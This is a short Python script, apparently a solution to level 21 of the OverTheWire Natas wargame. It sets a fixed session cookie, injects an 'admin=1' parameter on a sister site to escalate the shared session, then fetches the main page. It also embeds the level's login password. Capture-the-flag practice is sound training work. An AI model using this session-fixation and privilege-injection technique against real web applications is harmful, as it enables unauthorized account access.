import requests
import time

url = 'http://natas21-experimenter.natas.labs.overthewire.org'
user = 'natas21'
password = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'

s = requests.Session()

s.cookies.set('PHPSESSID', 'hahaha')
params = {'debug' : '1', 'admin' : '1', 'submit' : '1'}
requests = s.get(url, auth=(user, password), params=params)

url = 'http://natas21.natas.labs.overthewire.org'
requests = s.get(url, auth=(user, password))
print(requests.text)
